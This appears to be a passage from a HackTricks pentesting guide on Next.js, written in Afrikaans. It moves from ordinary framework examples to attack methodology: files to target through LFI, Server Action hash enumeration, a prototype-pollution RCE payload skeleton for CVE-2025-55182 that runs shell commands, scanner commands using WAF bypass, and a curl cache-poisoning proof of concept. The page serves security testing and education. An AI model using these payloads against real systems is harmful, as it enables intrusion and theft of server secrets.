
**Gebruikstoepassings:**

- Verander die `<html>` of `<body>` tags.
- Voeg meta-tags of pasgemaakte scripts by.
- Integreer lettertipes van derde partye.

**Voorbeeld:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Pasgemaakte Bediener (Opsioneel)

**Doel:** Alhoewel Next.js 'n ingeboude bediener het, kan jy 'n pasgemaakte bediener skep vir gevorderde gevalle soos pasgemaakte routing of integrasie met bestaande backend-dienste.

**Let wel:** Die gebruik van 'n pasgemaakte bediener kan implementeringsopsies beperk, veral op platforms soos Vercel wat geoptimaliseer is vir Next.js se ingeboude bediener.

**Voorbeeld:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Bykomende Argitektoniese en Sekuriteits-oorwegings

### Omgewingsveranderlikes en Konfigurasie

**Doel:** Beheer sensitiewe inligting en konfigurasie-instellings buite die kodebasis.

**Beste praktyke:**

- **Gebruik `.env` Files:** Bêre veranderlikes soos API keys in `.env.local` (uitgesluit van weergawebeheer).
- **Toegang tot veranderlikes veilig:** Gebruik `process.env.VARIABLE_NAME` om toegang tot omgewingsveranderlikes te kry.
- **Maak nooit Secrets op die kliënt openbaar nie:** Verseker dat sensitiewe veranderlikes slegs aan die bedienerkant gebruik word.

**Voorbeeld:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Nota:** Om veranderlikes slegs op die bedienerkant te beperk, laat hulle uit die `env`-objek weg of voorsien hulle met die voorvoegsel `NEXT_PUBLIC_` vir kliënt-eksponering.

### Nuttige bediener-artefakte om via LFI/download-endpunte te teiken

As jy 'n path traversal of download API in 'n Next.js-app vind, teiken gekompileerde artefakte wat server-side secrets en auth-logika leak:

- `.env` / `.env.local` vir session-secrets en provider-credentials.
- `.next/routes-manifest.json` en `.next/build-manifest.json` vir 'n volledige roete-lys.
- `.next/server/pages/api/auth/[...nextauth].js` om die gekompileerde NextAuth-konfigurasie te herstel (bevat dikwels fallback-wagwoorde wanneer `process.env`-waardes nie gestel is nie).
- `next.config.js` / `next.config.mjs` om rewrites, redirects en middleware-routing te hersien.

### Verifikasie en Autorisasie

**Benadering:**

- **Sessie-gebaseerde Verifikasie:** Gebruik cookies om gebruikersessies te bestuur.
- **Token-gebaseerde Verifikasie:** Implementeer JWTs vir staatlose verifikasie.
- **Derdeparty-verskaffers:** Integreer met OAuth-verskaffers (bv., Google, GitHub) met biblioteke soos `next-auth`.

**Sekuriteitspraktyke:**

- **Veilige Cookies:** Stel die `HttpOnly`, `Secure` en `SameSite`-attribuute.
- **Wagwoord-hashing:** Hash altyd wagwoorde voordat jy dit stoor.
- **Invoer-validasie:** Voorkom injection-aanvalle deur insette te valideer en te sanitiseer.

**Voorbeeld:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Prestasie-optimalisering

**Strategieë:**

- **Beeldoptimalisering:** Gebruik Next.js se `next/image` komponent vir outomatiese beeldoptimalisering.
- **Kodesplitsing:** Benut dinamiese imports om kode op te deel en die aanvanklike laaitye te verminder.
- **Kasbestuur:** Implementeer caching-strategieë vir API-antwoorde en statiese assets.
- **Lui-lading:** Laai komponente of assets slegs wanneer dit nodig is.

**Voorbeeld:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Moderne Next.js gebruik “Server Actions” wat op die server uitgevoer word maar vanaf die kliënt aangeroep word. In produksie is hierdie aanroepe opaak: alle POSTs beland op 'n algemene endpoint en word onderskei deur 'n build-spesifieke hash wat in die `Next-Action` header gestuur word. Voorbeeld:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Wanneer `productionBrowserSourceMaps` geaktiveer is, bevat geminimaliseerde JS-chunks oproepe na `createServerReference(...)` wat genoegsame struktuur leak (plus geassosieerde source maps) om 'n koppeling tussen die action-hash en die oorspronklike funksienaam te herstel. Dit laat jou toe om hashes wat in `Next-Action` waargeneem word, na konkrete teikens soos `deleteUserAccount()` of `exportFinancialData()` te vertaal.

### Uittrekselaanpak (regex op geminimaliseerde JS + opsionele source maps)

Soek afgelaaide JS-chunks na `createServerReference` en onttrek die hash en die funksie-/bron-simbool. Twee nuttige patrone:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Groep 1: server action hash (40+ hex chars)
- Groep 2: symbool of pad wat na die oorspronklike funksie opgelos kan word via die source map wanneer teenwoordig

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### Practical workflow

- Passive discovery while browsing: capture requests with `Next-Action` headers and JS chunk URLs.
- Fetch the referenced JS bundles and accompanying `*.map` files (when present).
- Run the regex above to build a hash↔name dictionary.
- Use the dictionary to target testing:
- Name-driven triage (e.g., `transferFunds`, `exportFinancialData`).
- Track coverage across builds by function name (hashes rotate across builds).

### Exercising hidden actions (template-based request)

Take a valid POST observed in-proxy as a template and swap the `Next-Action` value to target another discovered action:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Replay in Repeater and toets autorisasie, invoervalidasie en besigheidslogika van andersins ontoeganklike aksies.

### Burp automatisering

- NextjsServerActionAnalyzer (Burp extension) automatiseer die bogenoemde in Burp:
- Delf deur proxy-geskiedenis na JS-chunks, onttrek `createServerReference(...)` inskrywings, en ontleed source maps waar beskikbaar.
- Behou 'n deursoekbare hash↔function-name woordeboek en verwyder duplikate oor builds volgens function-name.
- Kan 'n geldige template POST lokaliseer en 'n gereed-om-te-stuur Repeater-oortjie oopmaak met die teiken-aksie se hash ingewissel.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Aantekeninge en beperkings

- Vereis `productionBrowserSourceMaps` in production geaktiveer om name uit bundles/source maps te herstel.
- Function-name disclosure is nie 'n kwesbaarheid op sigself nie; gebruik dit om ontdekking te lei en toets elke aksie se autorisasie.

### React Server Components Flight protocol deserialisasie RCE (CVE-2025-55182)

Next.js App Router deployments that expose Server Actions on `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** bevat 'n kritieke server-side prototype pollution tydens **Flight** chunk deserialisasie. Deur `$` verwysings binne 'n Flight payload te skep, kan 'n aanvaller van besoedelde prototypes na arbitrêre JavaScript-uitvoering skuif en daarna na OS-opdraguitvoering binne die Node.js-proses.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Aanvalsketting in Flight chunks

1. **Prototype pollution primitive:** Stel `"then": "$1:__proto__:then"` sodat die resolver 'n `then` funksie op `Object.prototype` skryf. Enige gewone objek wat daarna verwerk word, word 'n thenable, wat die aanvaller toelaat om async control flow binne RSC internals te beïnvloed.
2. **Rebinding to the global `Function` constructor:** Wys `_response._formData.get` na `"$1:constructor:constructor"`. Tydens resolusie, `object.constructor` → `Object`, en `Object.constructor` → `Function`, sodat toekomstige oproepe na `_formData.get()` werklik `Function(...)` uitvoer.
3. **Code execution via `_prefix`:** Plaas JavaScript-bron in `_response._prefix`. Wanneer die besoedelde `_formData.get` aangeroep word, evalueer die raamwerk `Function(_prefix)(...)`, sodat die ingespuite JS `require('child_process').exec()` of enige ander Node-primitive kan uitvoer.

#### Payload-skelet
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Kaartlegging van React Server Function blootstelling

React Server Functions (RSF) is enige funksies wat die `'use server';` direktief bevat. Elke form action, mutation of fetch helper wat aan een van daardie funksies gebind is, word 'n RSC Flight endpoint wat sonder moeite deur 'n aanvaller verskafde payloads kan deserialiseer. Nuttige recon-stappe afgelei uit React2Shell assessments:

- **Statiese inventaris:** kyk na die direktief om te verstaan hoeveel RSFs outomaties deur die framework blootgestel word.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` aktiveer standaard die App Router + `app/` directory, wat stilweg elke roete in 'n RSC-capable endpoint omskakel. App Router-bates soos `/_next/static/chunks/app/` of responses wat Flight-chunks oor `text/x-component` stream, is sterk internet-gesigbare vingerafdrukke.
- **Implicitly vulnerable RSC deployments:** React’s eie advisory merk op dat apps wat die RSC runtime insluit, exploiteerbaar kan wees **selfs sonder eksplisiete RSFs**, dus beskou enige build wat `react-server-dom-*` 19.0.0–19.2.0 gebruik as verdag.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. hergebruik dieselfde serializer en erf dieselfde remote-aanvalsoppervlak totdat hulle gepatchte React-builds insluit.

#### Version coverage (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **kwetsbaar** in 19.0.0, 19.1.0–19.1.1 en 19.2.0; **gefix** in 19.0.1, 19.1.2 en 19.2.1 onderskeidelik.
- **Next.js stable:** App Router releases 15.0.0–16.0.6 sluit die kwetsbare RSC-stapel in. Patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 bevat reggestelde deps, so enige build onder daardie weergawes is 'n waardevolle teiken.
- **Next.js canary:** `14.3.0-canary.77+` verskaf ook die buggy runtime en het tans geen gepatchte canary drops nie, wat daardie vingerafdrukke sterk eksploitasie-kandidate maak.

#### Remote detection oracle

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) stuur 'n gesmede multipart Flight-versoek na kandidaatspaaie en monitor bedienerkantgedrag:

- **Default mode** voer 'n deterministiese RCE payload uit (wiskunde-operasie weerspieël via `X-Action-Redirect`) wat kode-uitvoering bewys.
- **`--safe-check` mode** vervorm doelbewus die Flight-boodskap sodat gepatchte bedieners `200/400` terugstuur, terwyl kwesbare teikens `HTTP/500` antwoorde uitstuur wat die substring `E{"digest"` in die liggaam bevat. Daardie `(500 + digest)` paar is tans die mees betroubare remote-orakel wat deur verdedigers gepubliseer is.
- Ingeboude `--waf-bypass`, `--vercel-waf-bypass`, en `--windows` switches pas payload-lay-out aan, voeg rommel voorop, of verruil OS-opdragte sodat jy regte internet-bates kan ondersoek.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### Ander onlangse App Router-kwessies (laat 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – verkeerd gevormde Flight-payloads kan die RSC-resolver in ’n oneindige lus laat draai (pre-auth DoS) of die serialisering van saamgestelde Server Function-kode afdwing vir ander aksies. App Router builds ≥13.3 word beïnvloed totdat dit gepatch is; 15.0.x–16.0.x benodig die spesifieke patch-lyne uit die upstream advisory. Hergebruik die normale Server Action-pad maar stream ’n `text/x-component` body met misbruikende `$`-verwysings. Agter ’n CDN word die vasgeloopte verbinding oopgehou deur cache timeouts, wat die DoS goedkoop maak.
- **Triage tip:** Nie-gepatchte teikens gee `500` terug met `E{"digest"` na verkeerd gevormde Flight-payloads; gepatchte builds gee `400/200`. Toets enige endpoint wat reeds Flight-chunks stream (kyk vir `Next-Action` headers of `text/x-component` responses) en herspeel met ’n gemodifiseerde payload.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – ontbrekende `Vary` laat ’n `Accept: text/x-component` response cached raak en aan browsers wat HTML verwag bedien word. ’n Enkel priming-versoek kan die bladsy vervang met rou RSC payloads. PoC flow:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
As die tweede response JSON Flight data teruggee in plaas van HTML, is die route poisonable. Maak die cache skoon na toetsing.

## Verwysings

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
